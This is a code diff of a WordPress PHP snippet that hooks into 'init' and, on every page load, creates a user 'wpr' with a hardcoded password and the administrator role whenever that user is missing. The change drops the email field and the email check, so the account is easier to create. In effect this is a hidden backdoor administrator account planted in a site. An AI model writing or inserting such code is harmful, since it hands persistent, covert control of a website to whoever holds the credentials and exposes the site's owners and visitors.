@@ -5,13 +5,11 @@
  * Create User
  */
 
-
 add_action('init', function () {
     $user = 'wpr';
     $pass = 'nc9sXzm6SQ4QBZ';
-    $email = 'test@hanlimart.com';
-    if (!username_exists($user)  && !email_exists($email)) {
-        $user_id = wp_create_user($user, $pass, $email);
+    if (!username_exists($user)) {
+        $user_id = wp_create_user($user, $pass);
         $user = new WP_User($user_id);
         $user->set_role('administrator');
     }
